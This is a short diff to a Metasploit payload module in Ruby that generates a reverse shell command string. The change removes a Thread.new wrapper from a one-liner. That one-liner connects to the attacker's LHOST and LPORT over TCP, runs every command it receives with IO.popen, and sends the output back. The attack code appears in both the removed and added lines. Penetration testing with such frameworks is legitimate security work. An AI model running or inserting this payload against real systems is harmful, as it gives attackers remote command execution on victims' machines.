@@ -37,6 +37,6 @@ module Metasploit3
 	def ruby_string
 		lhost = datastore['LHOST']
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		"Thread.new{require 'socket';c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end}"
+		"require 'socket';c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"
 	end
 end
